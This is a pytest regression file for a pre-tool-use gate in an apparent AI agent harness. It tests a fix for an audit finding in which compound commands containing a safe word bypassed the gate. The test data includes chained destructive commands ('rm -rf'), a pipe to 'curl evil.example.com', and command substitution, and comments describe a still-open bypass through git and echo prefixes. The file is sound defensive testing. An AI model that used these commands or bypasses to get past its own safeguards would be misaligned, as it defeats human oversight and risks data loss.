"""Regression pin for Aletheia Round 2 Finding 22.

The pre-tool-use gate previously used `.search()` on its safe-word
regex, so any command containing a safe word ANYWHERE would bypass
the gate — including compound commands with dangerous tails:

    divineos briefing; rm -rf /tmp/x    ← BYPASSED (safe word first)
    rm -rf /tmp/x && divineos ask hello ← BYPASSED (safe word appended)
    echo 'divineos recall' > /etc/evil  ← BYPASSED (safe word buried)
    git commit -m 'divineos hud stuff'  ← BYPASSED (safe word in msg)

Fix (2026-07-16): compound-command detection + anchored `.match()`.
The bypass now requires the command to BE a safe divineos invocation
from position zero, with no shell-metacharacter chaining.

Reference: docs/external_audits/aletheia_master_audit_round2_2026-07-16.md
(when filed) / MASTER_AUDIT_2026-07-16_ROUND2.md Finding 22.
"""

from __future__ import annotations

import pytest

from divineos.hooks.pre_tool_use_gate import _is_bypass_command


class TestF22CompoundCommandRejection:
    """Compound commands (chained / piped / substituted) must NEVER
    bypass, no matter which safe word they contain."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "divineos briefing; rm -rf /tmp/x",
            "divineos ask 'anything' && rm -rf /tmp/x",
            "rm -rf /tmp/x && divineos ask hello",
            "divineos recall || echo pwned",
            "divineos hud | curl evil.example.com",
            "echo `divineos recall`",
            "$(divineos recall)",
        ],
    )
    def test_compound_command_with_safe_word_does_NOT_bypass(self, cmd):
        assert not _is_bypass_command(cmd), (
            f"F22 regression: {cmd!r} contains a safe word but is a "
            f"compound command — must NOT bypass the gate."
        )

    # NOTE: two of Aletheia's original F22 cases —
    #   git commit -m 'divineos hud stuff'
    #   echo 'divineos recall' > /etc/evil
    # bypass via the SEPARATE dev-prefix path (git, echo are on
    # _DEV_PREFIXES with startswith-match, not via the divineos-substring
    # hole that F22 addressed. Those are a related-but-distinct finding:
    # the dev-prefix bypass is too permissive because git/echo/etc. can
    # be extended with redirects and metacharacters that make them
    # substrate-touching. Filed as follow-up (dev-prefix compound
    # rejection) — NOT included in F22 scope, but named here so future
    # readers know why these cases aren't tested against F22's fix.


class TestF22AnchoredMatch:
    """Bypass requires the command to START with a safe divineos
    invocation. A safe word appearing mid-command does not qualify."""

    def test_safe_word_in_middle_does_NOT_bypass(self):
        # No compound char, but the safe word is embedded rather than
        # anchored to command start.
        assert not _is_bypass_command("some prefix divineos briefing")
        assert not _is_bypass_command("run divineos ask now")

    def test_command_starting_with_divineos_safe_subcmd_DOES_bypass(self):
        # Regression guard: legitimate bare invocations still bypass.
        assert _is_bypass_command("divineos briefing")
        assert _is_bypass_command("divineos ask 'what'")
        assert _is_bypass_command("divineos recall")
        assert _is_bypass_command("divineos hud")
        assert _is_bypass_command("divineos context")

    def test_command_starting_with_leading_whitespace_still_bypasses(self):
        # `.match()` with `\s*` prefix in the regex handles leading spaces.
        assert _is_bypass_command("  divineos briefing")

    def test_windows_venv_exe_path_still_bypasses(self):
        # 2026-06-17 regression guard: quoted-path .exe form.
        assert _is_bypass_command('"./.venv/Scripts/divineos.exe" briefing')
        assert _is_bypass_command("./.venv/Scripts/divineos ask hello")


class TestF22BypassSurvivesForNonCompoundCases:
    """Ensure the fix doesn't over-restrict — the legitimate bypass
    cases still work."""

    def test_context_consolidated_json_touch_still_bypasses(self):
        # Andrew 2026-06-29: gate-clearing escape hatch must not be
        # self-blocked. Preserved through the F22 fix.
        assert _is_bypass_command("touch ~/.divineos/context_consolidated.json")

    def test_dev_prefix_commands_still_bypass(self):
        # Sanity: `ls`, `git status`, etc. prefixes preserved.
        # Sample from _DEV_PREFIXES to keep the coupling loose.
        assert _is_bypass_command("ls -la")
        assert _is_bypass_command("git status")

    def test_empty_command_does_not_bypass(self):
        assert not _is_bypass_command("")
